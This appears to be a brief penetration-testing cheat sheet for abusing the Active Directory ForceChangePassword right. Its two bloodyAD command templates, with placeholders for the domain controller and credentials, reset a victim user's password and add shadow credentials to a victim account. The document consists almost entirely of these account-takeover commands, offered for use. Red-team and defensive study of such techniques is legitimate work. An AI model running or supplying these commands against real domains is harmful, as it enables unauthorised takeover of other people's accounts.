# ForceChangePassword

## 1. Setting Password
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' set password "<VICTIM_USER>" "<VICTIM_PASS>"
```

## 1a. Setting Shadow Credentials
```
bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' add shadowCredentials "<VICTIM_USER>"
```
